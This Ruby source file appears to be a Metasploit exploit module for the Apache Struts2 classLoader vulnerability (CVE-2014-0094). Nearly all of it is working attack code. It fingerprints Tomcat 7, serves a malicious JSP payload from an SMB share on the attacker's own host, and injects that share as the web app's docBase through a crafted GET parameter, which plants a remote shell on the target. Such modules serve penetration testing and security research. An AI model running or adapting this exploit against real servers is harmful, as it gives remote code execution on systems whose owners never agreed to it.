##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::SMBFileServer

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'Struts JSP Injection over HTTP',
      'Description'   => %q{
        This module exploits the classLoader Apache Struts2 
        vulnerability to inject a JSP shell over SMB.
      },
      'Author'      => [
        'Matthew Hall <hallm@sec-1.com>',
      ],
      'DisclosureDate' => 'May 1 2014',
      'Platform'       => 'win',
      'Privileged'     => true,
      'References'     =>
        [
          [ 'URL', 'http://www.sec-1.com/blog/'],
          [ 'CVE', '2014-0094' ],
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'process',
          'DisablePayloadHandler' => 'false',
        },
      'Privileged'     => true,
      'Arch'           => ARCH_JAVA,
      'Platform'       => [ 'win'],
      'Targets'        =>
        [
          [ 'Apache Struts', { } ]
        ],
      'DefaultTarget'  => 0,
      ))
      register_options(
        [
          OptString.new('UNCPATH',  [false, 'Override the UNC path to use (Ex: \\\\192.168.1.1\\share)' ]),
          OptString.new('URI',      [true,  'Path to vulnerable Struts action file', '/struts2-blank/example/HelloWorld.action', true ]),
          OptString.new('SHARE',    [false, 'A static share path (ie. "share")']),
          OptString.new('JSP',      [false, 'A static JSP name (ie. "/example/HelloWorld.jsp")']),
          Opt::RPORT(8080)
        ], self.class)
  end

  def check
    res = send_request_raw({'uri'=>'/struts2-blank/example/HelloWorld.action'}) 
    res2 = send_request_raw({'uri'=>'/'}) 
    if res and res.body =~ /Struts is up and running/ and res2 and res2.body =~ /Apache Tomcat\/7\./
      return Exploit::CheckCode::Vulnerable
    end
    res3 = send_request_raw({'uri'=>datastore['URI']})
    if res3 and res2 and res2.body =~ /Apache Tomcat\/7\./
      return Exploit::CheckCode::Vulnerable
    end
    if res2 and res2.body =~ /Apache Tomcat\/7\./
      return Exploit::CheckCode::Appears 
    end

    return Exploit::CheckCode::Safe
  end

  def start_server 
    if (datastore['UNCPATH'])
      @unc = datastore['UNCPATH']
      print_status("Remember to share the malicious JSP payload as #{@unc}")
    else
      print_status("Generating our malicious jsp...")
      jsp = payload.encoded 

      # Check if URI and JSP differ
      if not datastore['JSP']
        @jsp_file = datastore['URI'].split('/').last(2).join('/').gsub(/action/, 'jsp')
      else
        @jsp_file = datastore['JSP']
      end
      @jsp_file = @jsp_file.gsub(/\\/, '/')
      @jsp_file = @jsp_file.gsub(/\/\/\/\//, '/')

      if not datastore['SHARE']
        @share = rand_text_alpha(5)
      else
        @share = datastore['SHARE']
      end

      my_host = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address : datastore['SRVHOST']
      @unc = "\\\\#{my_host}\\#{@share}"
      vprint_status("About to start SMB Server on: " + @unc + " for " + @jsp_file)
      start_smb_server(@unc, jsp, @jsp_file)
    end
  end

  def exploit
    start_server
    share = "#{@unc}"
    sploit = datastore['URI'] 
    share = share.gsub(/\\/, '/')
    #sploit << '?class.classLoader.resources.dirContext.docBase='
    sploit << '?Class.classLoader.resources.dirContext.docBase='
    #sploit << "?class['classLoader']['resources']['dirContext']['docBase']="
    sploit << share
    print_status("Injecting JSP to #{datastore['RHOST']}:#{datastore['RPORT']} - #{sploit}")

    res = send_request_raw({
      'method' => 'GET',
      'uri' => sploit
    }, 30)

    if res and res.code == 200 
      print_status("#{peer} - JSP payload uploaded successfully")
      handler
    else
      fail_with(Failure::Unknown, "#{peer} - JSP payload upload failed")
    end
  end
end
